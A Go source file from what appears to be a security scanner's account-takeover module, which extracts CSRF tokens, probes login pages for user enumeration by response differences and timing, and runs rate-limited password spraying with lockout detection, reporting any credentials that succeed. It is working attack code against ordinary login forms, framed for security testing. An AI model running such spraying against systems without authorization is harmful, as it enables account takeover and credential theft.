// -- pkg/analysis/auth/ato/analyzer.go --
package ato

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/google/uuid"
	"go.uber.org/zap"
	"golang.org/x/net/publicsuffix"
	"golang.org/x/time/rate"

	"github.com/xkilldash9x/scalpel-cli/pkg/analysis/core"
)

// Constants for user enumeration heuristics and operational limits.
const (
	// EnumContentLengthThreshold is the minimum difference in bytes to suspect enumeration.
	EnumContentLengthThreshold = 100
	// EnumTimingThresholdMs is the minimum difference in milliseconds to suspect enumeration via timing analysis.
	EnumTimingThresholdMs = 200
	// MaxBodyReadSize limits response body reading to prevent OOM errors on large responses.
	MaxBodyReadSize = 2 * 1024 * 1024 // 2 MB
	// MaxConsecutiveErrors is the number of consecutive network errors before aborting a spray.
	MaxConsecutiveErrors = 5
)

// Config holds the configuration for the ATO analyzer.
type Config struct {
	ScanID            uuid.UUID
	LoginURL          string
	ContentType       string
	UserField         string
	PassField         string
	CSRFField         string
	KnownUsers        []string
	MaxGlobalAttempts int
	DelayBetween      time.Duration
}

// Analyzer is the brains of the operation for trying to steal passwords.
type Analyzer struct {
	config   Config
	client   *http.Client
	logger   *zap.Logger
	reporter core.Reporter
}

var (
	// Regex 1: name attribute appears before value attribute.
	csrfTokenRegexNameFirst = regexp.MustCompile(`(?i)<input[^>]*?name=["']?(?:csrf|token|_csrf|authenticity_token|__RequestVerificationToken)["']?[^>]*?value=["']?([a-zA-Z0-9+/=_-]{16,})["']?`)
	// Regex 2: value attribute appears before name attribute.
	csrfTokenRegexValueFirst = regexp.MustCompile(`(?i)<input[^>]*?value=["']?([a-zA-Z0-9+/=_-]{16,})["']?[^>]*?name=["']?(?:csrf|token|_csrf|authenticity_token|__RequestVerificationToken)["']?`)
)

// NewAnalyzer initializes the ATO analyzer.
func NewAnalyzer(cfg Config, logger *zap.Logger, reporter core.Reporter) *Analyzer {
	// Set configuration defaults during initialization.
	if cfg.ContentType == "" {
		cfg.ContentType = "application/x-www-form-urlencoded"
	}
	if cfg.CSRFField == "" {
		// A reasonable default if not specified by the user.
		cfg.CSRFField = "csrf_token"
	}

	jar, err := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
	if err != nil {
		logger.Error("Failed to initialize cookie jar", zap.Error(err))
	}

	return &Analyzer{
		config: cfg,
		client: &http.Client{
			Timeout: 20 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
			Jar: jar,
		},
		logger:   logger.Named("ato_analyzer"),
		reporter: reporter,
	}
}

// Run executes the full ATO testing workflow.
func (a *Analyzer) Run(ctx context.Context) error {
	a.logger.Info("Starting ATO analysis", zap.String("target", a.config.LoginURL))
	var allFindings []core.AnalysisResult

	// 1. Check for CSRF protection and fetch initial token.
	initialCSRFToken, requiresCSRF, err := a.fetchCSRFToken(ctx)
	if err != nil {
		a.logger.Warn("Failed to fetch initial page for CSRF check. Proceeding without CSRF handling.", zap.Error(err))
		requiresCSRF = false
	}

	// 2. Check for user enumeration.
	enumFindings, err := a.checkUserEnumeration(ctx, initialCSRFToken, requiresCSRF)
	if err != nil {
		a.logger.Warn("User enumeration check failed or encountered errors", zap.Error(err))
	}
	allFindings = append(allFindings, enumFindings...)

	// 3. Execute password spraying.
	sprayFindings, err := a.executePasswordSpraying(ctx, initialCSRFToken, requiresCSRF)
	if err != nil {
		return fmt.Errorf("password spraying attack failed: %w", err)
	}
	allFindings = append(allFindings, sprayFindings...)

	// 4. Report all findings collected during the run.
	for _, finding := range allFindings {
		if err := a.reporter.Publish(finding); err != nil {
			a.logger.Error("Failed to publish finding", zap.Error(err), zap.String("title", finding.Title))
		}
	}

	return nil
}

// fetchCSRFToken makes a GET request to the login URL to extract a CSRF token.
func (a *Analyzer) fetchCSRFToken(ctx context.Context) (string, bool, error) {
	a.logger.Debug("Fetching login page to check for CSRF tokens.")
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, a.config.LoginURL, nil)
	if err != nil {
		return "", false, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36")

	resp, err := a.client.Do(req)
	if err != nil {
		return "", false, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", false, fmt.Errorf("received non-200 status code: %d", resp.StatusCode)
	}

	// Check 1: Common CSRF Headers (often used by SPAs/APIs)
	commonHeaders := []string{"X-CSRF-Token", "X-XSRF-TOKEN", "Csrf-Token", "X-Auth-Token"}
	for _, header := range commonHeaders {
		if token := resp.Header.Get(header); token != "" {
			a.logger.Info("Found potential CSRF token in response header.", zap.String("header", header))
			return token, true, nil
		}
	}

	// Check 2: Parse HTML Body
	bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, MaxBodyReadSize))
	if err != nil {
		return "", false, err
	}

	// Attempt to find the token using regex directly on the byte slice.
	// Attempt 1: Name attribute before Value
	matches := csrfTokenRegexNameFirst.FindSubmatch(bodyBytes)
	if len(matches) > 1 {
		token := string(matches[1])
		a.logger.Info("Found potential CSRF token in HTML input (name first).")
		return token, true, nil
	}

	// Attempt 2: Value attribute before Name
	matches = csrfTokenRegexValueFirst.FindSubmatch(bodyBytes)
	if len(matches) > 1 {
		token := string(matches[1])
		a.logger.Info("Found potential CSRF token in HTML input (value first).")
		return token, true, nil
	}

	a.logger.Debug("No CSRF token found in headers or HTML inputs.")
	return "", false, nil
}

// checkUserEnumeration actively probes the login page for info leaks and returns any findings.
func (a *Analyzer) checkUserEnumeration(ctx context.Context, csrfToken string, requiresCSRF bool) ([]core.AnalysisResult, error) {
	var findings []core.AnalysisResult

	// Helper to create a finding and append it to the slice.
	createFinding := func(title, description string, evidence *core.Evidence) {
		findings = append(findings, core.AnalysisResult{
			ScanID:            a.config.ScanID,
			AnalyzerName:      "ATOAnalyzer (Active)",
			Timestamp:         time.Now().UTC(),
			VulnerabilityType: "UserEnumeration",
			Title:             title,
			Description:       description,
			Severity:          core.SeverityMedium,
			Status:            core.StatusOpen,
			Confidence:        0.9,
			TargetURL:         a.config.LoginURL,
			Evidence:          evidence,
		})
	}

	// Attempt 1: Baseline (known valid user with a bogus password).
	var baselineResponse *LoginResponse
	if len(a.config.KnownUsers) > 0 {
		attempt := LoginAttempt{
			Username:  a.config.KnownUsers[0],
			Password:  "InvalidPassword!Scalpel_Enum",
			CSRFToken: csrfToken,
		}
		resp, err := a.sendLoginRequest(ctx, attempt, requiresCSRF)
		if err != nil {
			a.logger.Warn("Failed to establish baseline response with known user", zap.Error(err))
		} else {
			baselineResponse = resp
		}
	}

	// Attempt 2: Invalid user.
	invalidUsername := fmt.Sprintf("scalpel_enum_test_%d", time.Now().UnixNano())
	attemptInvalid := LoginAttempt{
		Username:  invalidUsername,
		Password:  "InvalidPassword!Scalpel_Enum",
		CSRFToken: csrfToken,
	}
	respInvalid, err := a.sendLoginRequest(ctx, attemptInvalid, requiresCSRF)
	if err != nil {
		return findings, fmt.Errorf("request for invalid user failed: %w", err)
	}

	// Check 1: Verbose Error Messages
	if respInvalid.IsUserEnumeration || (baselineResponse != nil && baselineResponse.IsUserEnumeration) {
		detail := respInvalid.EnumerationDetail
		if detail == "" && baselineResponse != nil {
			detail = baselineResponse.EnumerationDetail
		}
		createFinding("User Enumeration via Verbose Error Messages", detail, respInvalid.Evidence)
		return findings, nil
	}

	// If no verbose messages, compare responses (if baseline exists).
	if baselineResponse != nil {
		// Check 2: Status Code Differentiation
		if baselineResponse.StatusCode != respInvalid.StatusCode {
			detail := fmt.Sprintf("Valid user resulted in status %d, invalid user resulted in status %d.", baselineResponse.StatusCode, respInvalid.StatusCode)
			createFinding("User Enumeration via Status Code Differentiation", detail, respInvalid.Evidence)
		}

		// Check 3: Content Length Differentiation
		if abs(len(baselineResponse.ResponseBody)-len(respInvalid.ResponseBody)) > EnumContentLengthThreshold {
			detail := fmt.Sprintf("Valid user resulted in length %d, invalid user resulted in length %d.", len(baselineResponse.ResponseBody), len(respInvalid.ResponseBody))
			createFinding("User Enumeration via Content Length Differentiation", detail, respInvalid.Evidence)
		}

		// Check 4: Timing Analysis
		timeDiff := baselineResponse.ResponseTimeMs - respInvalid.ResponseTimeMs
		if timeDiff > EnumTimingThresholdMs {
			detail := fmt.Sprintf("The application takes significantly longer to respond to valid users. Valid user: %dms, Invalid user: %dms.", baselineResponse.ResponseTimeMs, respInvalid.ResponseTimeMs)
			createFinding("User Enumeration via Timing Analysis", detail, respInvalid.Evidence)
		}
	}

	return findings, nil
}

// executePasswordSpraying runs the low and slow attack.
func (a *Analyzer) executePasswordSpraying(ctx context.Context, initialCSRFToken string, requiresCSRF bool) ([]core.AnalysisResult, error) {
	var findings []core.AnalysisResult
	if len(a.config.KnownUsers) == 0 {
		return findings, nil
	}

	payloads := GenerateSprayingPayloads(a.config.KnownUsers)
	attempts := 0
	consecutiveErrors := 0
	lockoutDetected := false
	currentCSRFToken := initialCSRFToken

	// Setup a rate limiter for precise control and graceful context cancellation.
	rps := float64(1000) // A high default if delay is zero.
	if a.config.DelayBetween > 0 {
		rps = 1.0 / a.config.DelayBetween.Seconds()
	}
	limiter := rate.NewLimiter(rate.Limit(rps), 1)

	for _, attempt := range payloads {
		if attempts >= a.config.MaxGlobalAttempts {
			a.logger.Info("Max global attempts reached. Stopping attack.")
			break
		}

		// Wait for the rate limiter before proceeding. This handles context cancellation correctly.
		if err := limiter.Wait(ctx); err != nil {
			return findings, err // Context was canceled while waiting.
		}

		if requiresCSRF && currentCSRFToken == "" {
			newToken, _, err := a.fetchCSRFToken(ctx)
			if err != nil || newToken == "" {
				a.logger.Warn("CSRF required but failed to refresh token. Halting attack.", zap.Error(err))
				break
			}
			currentCSRFToken = newToken
		}

		attempt.CSRFToken = currentCSRFToken
		
		resp, err := a.sendLoginRequest(ctx, attempt, requiresCSRF)
		attempts++ // Increment attempt counter regardless of network error.

		if err != nil {
			if ctx.Err() != nil {
				return findings, ctx.Err() // Context cancelled during request.
			}
			a.logger.Warn("Failed to send login request", zap.Error(err), zap.String("user", attempt.Username))
			consecutiveErrors++
			if consecutiveErrors >= MaxConsecutiveErrors {
				return findings, fmt.Errorf("aborting password spraying due to %d consecutive errors: %w", consecutiveErrors, err)
			}
			continue
		}
		consecutiveErrors = 0 // Reset error counter on a successful request.

		if resp.Success {
			detail := fmt.Sprintf("Successful authentication with Username: '%s' and Password: '%s' via Password Spraying.", attempt.Username, attempt.Password)
			findings = append(findings, core.AnalysisResult{
				ScanID:            a.config.ScanID,
				AnalyzerName:      "ATOAnalyzer (Active)",
				Timestamp:         time.Now().UTC(),
				VulnerabilityType: "AccountTakeover",
				Title:             "Account Takeover Successful (Password Spraying)",
				Description:       detail,
				Severity:          core.SeverityCritical,
				Status:            core.StatusOpen,
				Confidence:        1.0, // We did it ourselves.
				TargetURL:         a.config.LoginURL,
				Evidence:          resp.Evidence,
			})
		}

		if resp.IsLockout {
			a.logger.Info("Account lockout mechanism detected. Halting attack.")
			lockoutDetected = true
			break
		}
	}

	if !lockoutDetected && attempts > 15 {
		detail := fmt.Sprintf("The application allowed %d failed login attempts without enforcing an effective account lockout policy.", attempts)
		findings = append(findings, core.AnalysisResult{
			ScanID:            a.config.ScanID,
			AnalyzerName:      "ATOAnalyzer (Active)",
			Timestamp:         time.Now().UTC(),
			VulnerabilityType: "WeakLockoutPolicy",
			Title:             "Weak or Non-Existent Account Lockout Policy",
			Description:       detail,
			Severity:          core.SeverityHigh,
			Status:            core.StatusOpen,
			Confidence:        0.9,
			TargetURL:         a.config.LoginURL,
			Evidence:          nil,
		})
	}

	return findings, nil
}

// sendLoginRequest handles JSON or form data, including CSRF tokens.
func (a *Analyzer) sendLoginRequest(ctx context.Context, attempt LoginAttempt, includeCSRF bool) (*LoginResponse, error) {
	var bodyReader io.Reader
	var serializedReqBody string
	contentType := a.config.ContentType

	if strings.Contains(contentType, "application/json") {
		payload := map[string]string{
			a.config.UserField: attempt.Username,
			a.config.PassField: attempt.Password,
		}
		if includeCSRF && attempt.CSRFToken != "" {
			payload[a.config.CSRFField] = attempt.CSRFToken
		}

		jsonPayload, err := json.Marshal(payload)
		if err != nil {
			return nil, err
		}
		serializedReqBody = string(jsonPayload)
		bodyReader = bytes.NewReader(jsonPayload)
	} else {
		data := url.Values{}
		data.Set(a.config.UserField, attempt.Username)
		data.Set(a.config.PassField, attempt.Password)

		if includeCSRF && attempt.CSRFToken != "" {
			data.Set(a.config.CSRFField, attempt.CSRFToken)
		}

		serializedReqBody = data.Encode()
		// Use strings.NewReader for efficiency, it avoids an extra copy.
		bodyReader = strings.NewReader(serializedReqBody)
		contentType = "application/x-www-form-urlencoded"
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, a.config.LoginURL, bodyReader)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36")
	req.Header.Set("Origin", req.URL.Scheme+"://"+req.URL.Host)
	req.Header.Set("Referer", a.config.LoginURL)

	startTime := time.Now()
	resp, err := a.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	responseTimeMs := time.Since(startTime).Milliseconds()

	// Use LimitReader to prevent excessive memory usage from a large response.
	respBody, err := io.ReadAll(io.LimitReader(resp.Body, MaxBodyReadSize))
	if err != nil {
		return nil, err
	}

	analyzedResponse := AnalyzeResponse(attempt, resp.StatusCode, string(respBody), responseTimeMs)
	analyzedResponse.Evidence = &core.Evidence{
		Summary: fmt.Sprintf("Attempt with user: %s", attempt.Username),
		Request: &core.SerializedRequest{
			Method:  req.Method,
			URL:     a.config.LoginURL,
			Headers: req.Header,
			Body:    serializedReqBody,
		},
		Response: &core.SerializedResponse{
			StatusCode: resp.StatusCode,
			Headers:    resp.Header,
			Body:       string(respBody),
		},
	}

	return &analyzedResponse, nil
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}
